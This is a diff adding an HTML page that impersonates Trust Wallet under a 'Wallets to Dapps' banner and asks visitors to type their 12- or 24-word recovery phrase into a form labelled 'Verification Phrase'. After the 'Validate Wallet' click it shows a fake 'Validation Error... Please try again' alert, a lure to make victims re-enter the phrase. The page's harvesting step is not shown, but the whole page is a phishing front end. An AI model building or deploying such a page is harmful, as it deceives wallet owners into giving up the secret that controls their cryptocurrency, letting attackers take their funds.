@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content=" Wallets to Dapps">
+    <meta property="og:image" content="">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://kit.fontawesome.com/c8e4d183c2.js" crossorigin="anonymous"></script>
+    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+    <style>
+        :focus { outline: none; }
+      </style>
+</head>
+<body>
+    <section>
+        <nav>
+            <ul>
+                <li><a href="#"> Github </a></li>
+                <li><a href=""> Docs </a></li>
+                <li><a href=""> <img src="images/dapps.png" width="auto" height="40px" alt=""> </a></li>
+                <li><a href=""> Wallets </a></li>
+                <li><a href=""> Apps </a></li>
+            </ul>
+            </nav>
+            <br><br><br>
+            <div class="valtru">
+
+            <div class="validate-trust">
+                <div><img src="images/true.png" width="50" alt=""></div>
+                <div><h1>Trust Wallet</h1></div>
+            </div>
+            <div style="margin: auto;width: fit-content;">
+            <form action="" method="post" required>
+                <label for="trustlock">Wallet Name</label><br>
+                <button id="trustlock"><i class="fas fa-lock"></i> Trust Wallet</button>
+                <br><br><br>
+                <label for="Phrasee">Phrase</label><br>
+                <textarea type="text" id="Phrasee" minlength="12" placeholder="Enter Verification Phrase" name="trust-wallet-keyphrase" required></textarea><br>
+                <p style="text-align: center;">Typically 12 or 24 words separated by single spaces</p>
+                <button type="button" id="myBtn">VALIDATE WALLET &nbsp; <span style="font-size: 20px;font-weight: 900;"> &rarr;</span> </button>
+                <br><br><br><br><br>
+            </form>
+            </div>
+            </div>
+            <br><br><br><br><br>
+            <footer>
+                <ul>
+                    <li><a href="#"><i class="fab fa-discord"></i> Discord</a></li><br>
+                    <li><a href="#"><i class="fab fa-telegram"></i> Telegram</a></li><br>
+                    <li><a href="#"><i class="fab fa-twitter"></i> Twitter</a></li><br>
+                    <li><a href="#"><i class="fab fa-github"></i> Github</a></li><br>
+                </ul>
+            </footer>
+</section>
+<script>
+ var x = document.getElementById("myBtn");
+ x.addEventListener("click", myFunction);
+ x.addEventListener("click", someOtherFunction);
+
+ function myFunction() {
+     alert("Initializing...");
+ }
+
+ function someOtherFunction() {
+     alert("Validation Error... Please try again")
+ }
+</script>
+</body>
+</html>
